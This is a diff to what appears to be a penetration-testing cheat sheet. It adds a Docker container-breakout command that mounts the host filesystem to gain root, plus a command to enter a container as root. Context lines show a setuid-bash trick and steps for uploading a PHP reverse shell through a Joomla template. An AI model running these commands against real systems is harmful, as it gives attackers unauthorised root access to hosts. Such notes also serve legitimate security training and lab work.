@@ -211,7 +211,15 @@ chmod +s /bin/bash
 #### Joomla Reverse Shell
 > 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
 > 1. https://vk9-sec.com/reverse-shell-on-any-cms/
-	
+
+#### Docker breakout container
+> 1. If docker user is **root**.
+> 1. ```docker run -v /:/mnt --rm -it alpine chroot /mnt /sh```
+> 1. The above command will download a new alpine image, giving us root user access. Can be checked with ```id``` command.
+
+#### Go inside a docker
+> 1. ```docker container ls```
+> 1. ```docker exec -it -u 0 '1ef49e37fb8f'  /bin/bash```
 
 #### Windws Tricks
 ##### Download a file in Windows via certutil
